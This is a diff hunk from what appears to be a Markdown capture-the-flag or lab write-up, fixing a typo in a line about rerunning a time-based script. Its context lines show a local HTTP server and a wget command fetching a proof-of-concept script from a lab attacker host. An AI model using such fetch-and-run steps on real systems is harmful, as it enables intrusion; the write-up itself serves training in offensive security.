@@ -204,7 +204,7 @@ python3 -m http.server 80
 wget http://10.10.14.7/poc.sh
 ```
 
-its a time based script so if it doesnt work we need to run it multiple timesu ntil it works
+its a time based script so if it doesnt work we need to run it multiple times until it works
 
 ![](screen/Pasted%20image%2020251127164820.png)
 
